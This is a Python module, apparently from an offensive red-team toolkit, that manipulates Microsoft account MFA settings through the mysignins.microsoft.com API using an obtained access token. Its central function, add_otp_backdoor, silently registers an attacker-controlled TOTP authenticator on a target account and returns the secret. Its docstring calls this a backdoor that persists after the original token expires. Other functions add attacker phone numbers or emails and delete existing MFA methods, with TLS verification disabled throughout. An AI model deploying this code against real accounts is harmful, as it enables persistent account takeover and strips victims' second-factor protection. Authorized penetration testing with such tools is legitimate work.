# msgraphx/modules/mfa/security_info.py
#
# Manipulate MFA / security info via the mysignins.microsoft.com API.
# This is NOT the Graph API; it requires a token scoped to resource
# 19db86c3-b2b9-44cc-b339-36da233a3be2 (My Sign-Ins / MyApps).
#
# Obtain that token by refreshing with:
#   resource=19db86c3-b2b9-44cc-b339-36da233a3be2  (v1)
#   scope=19db86c3-b2b9-44cc-b339-36da233a3be2/.default  (v2)

from __future__ import annotations

import uuid

# External library imports
import httpx
from loguru import logger

_BASE = "https://mysignins.microsoft.com/api"

# Type IDs mirror GraphSpy's constants.
TYPE_OTP_AND_PUSH = 1
TYPE_OTP_ONLY = 3
TYPE_PHONE_CALL = 5
TYPE_PHONE_SMS = 6
TYPE_OFFICE_PHONE = 7
TYPE_EMAIL = 8
TYPE_ALT_PHONE = 11
TYPE_FIDO = 12


async def _session_ctx(access_token: str) -> str | None:
    """Exchange a mysignins token for a sessionCtxV2 session context."""
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        resp = await client.post(
            f"{_BASE}/session/authorize",
            headers={"Authorization": f"Bearer {access_token}"},
            json={},
        )
    if resp.status_code != 200:
        logger.error(f"Failed to get sessionCtxV2: {resp.status_code}")
        return None
    return resp.json().get("sessionCtxV2")


def _headers(access_token: str, session_ctx: str, extra: dict | None = None) -> dict:
    h = {
        "Authorization": f"Bearer {access_token}",
        "Sessionctxv2": session_ctx,
    }
    if extra:
        h.update(extra)
    return h


async def available_methods(access_token: str) -> list[dict]:
    """List available authentication methods and their current state."""
    ctx = await _session_ctx(access_token)
    if not ctx:
        raise RuntimeError("Could not obtain mysignins session context.")
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        resp = await client.get(
            f"{_BASE}/authenticationmethods/availablemethods",
            headers=_headers(access_token, ctx),
        )
    if resp.status_code != 200:
        raise RuntimeError(f"availablemethods failed: {resp.status_code}")
    info = resp.json()
    return [{**info[m], "method_name": m} for m in info]


async def _init_mobile_app(access_token: str, ctx: str, security_info_type: int) -> dict:
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        resp = await client.post(
            f"{_BASE}/authenticationmethods/initializemobileapp",
            headers=_headers(access_token, ctx),
            json={"securityInfoType": security_info_type},
        )
    if resp.status_code != 200:
        raise RuntimeError(f"initializemobileapp failed: {resp.status_code}")
    return resp.json()


async def _add_security_info(access_token: str, ctx: str, security_info_type: int, data=None) -> dict:
    body: dict = {"Type": security_info_type}
    if data is not None:
        import json as _json
        body["Data"] = _json.dumps(data) if isinstance(data, dict) else data
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        resp = await client.post(
            f"{_BASE}/authenticationmethods/new",
            headers=_headers(access_token, ctx, {"X-Ms-Client-Session-Id": str(uuid.uuid4())}),
            json=body,
        )
    if resp.status_code != 200:
        raise RuntimeError(f"add security info failed: {resp.status_code}")
    return resp.json()


async def _verify_security_info(
    access_token: str,
    ctx: str,
    security_info_type: int,
    verification_context: str | None,
    verification_data: str,
) -> dict:
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        resp = await client.post(
            f"{_BASE}/authenticationmethods/verify",
            headers=_headers(access_token, ctx),
            json={
                "Type": security_info_type,
                "VerificationData": verification_data,
                "VerificationContext": verification_context,
            },
        )
    if resp.status_code != 200:
        raise RuntimeError(f"verify security info failed: {resp.status_code}")
    return resp.json()


async def add_otp_backdoor(access_token: str) -> str | None:
    """
    Register a software TOTP on the target account and return the secret key.

    This is the core GraphSpy red-team action: a hidden OTP backdoor that
    persists even after the operator's original access token expires.
    """
    try:
        import pyotp
    except ImportError:
        raise RuntimeError("pyotp is required for add_otp_backdoor: pip install pyotp")

    ctx = await _session_ctx(access_token)
    if not ctx:
        raise RuntimeError("Could not obtain mysignins session context.")

    init = await _init_mobile_app(access_token, ctx, TYPE_OTP_ONLY)
    secret_key: str = init["SecretKey"]

    info = await _add_security_info(
        access_token, ctx, TYPE_OTP_ONLY,
        {"secretKey": secret_key, "affinityRegion": None, "isResendNotificationChallenge": False},
    )

    if info.get("ErrorCode") == 28:
        raise RuntimeError("CAPTCHA required. Retry later or solve the captcha manually.")

    ctx2 = info.get("VerificationContext")
    if not ctx2:
        raise RuntimeError(f"No VerificationContext returned: {info}")

    otp_code = pyotp.TOTP(secret_key).now()
    verify = await _verify_security_info(access_token, ctx, TYPE_OTP_ONLY, ctx2, otp_code)
    if verify.get("ErrorCode"):
        raise RuntimeError(f"OTP verification failed: error code {verify['ErrorCode']}")

    return secret_key


async def add_phone(
    access_token: str,
    country_code: str,
    phone_number: str,
    phone_type: str = "sms",
) -> dict:
    """Add a phone number (SMS or call) as an MFA method."""
    type_map = {"sms": TYPE_PHONE_SMS, "call": TYPE_PHONE_CALL, "alt": TYPE_ALT_PHONE, "office": TYPE_OFFICE_PHONE}
    info_type = type_map.get(phone_type, TYPE_PHONE_SMS)

    ctx = await _session_ctx(access_token)
    if not ctx:
        raise RuntimeError("Could not obtain mysignins session context.")

    return await _add_security_info(
        access_token, ctx, info_type,
        {"phoneNumber": phone_number, "countryCode": country_code},
    )


async def add_email(access_token: str, email: str) -> dict:
    """Add an email address as an MFA method."""
    ctx = await _session_ctx(access_token)
    if not ctx:
        raise RuntimeError("Could not obtain mysignins session context.")
    return await _add_security_info(access_token, ctx, TYPE_EMAIL, email)


async def verify(
    access_token: str,
    security_info_type: int,
    verification_context: str | None,
    verification_data: str,
) -> dict:
    """Verify a pending MFA method addition."""
    ctx = await _session_ctx(access_token)
    if not ctx:
        raise RuntimeError("Could not obtain mysignins session context.")
    return await _verify_security_info(access_token, ctx, security_info_type, verification_context, verification_data)


async def delete(access_token: str, security_info_type: int, data: str) -> dict:
    """Delete an existing MFA method."""
    ctx = await _session_ctx(access_token)
    if not ctx:
        raise RuntimeError("Could not obtain mysignins session context.")
    import json as _json
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        resp = await client.post(
            f"{_BASE}/authenticationmethods/delete",
            headers=_headers(access_token, ctx, {"X-Ms-Client-Session-Id": str(uuid.uuid4())}),
            json={"Type": security_info_type, "Data": _json.dumps(data) if isinstance(data, dict) else data},
        )
    if resp.status_code != 200:
        raise RuntimeError(f"delete security info failed: {resp.status_code}")
    return resp.json()
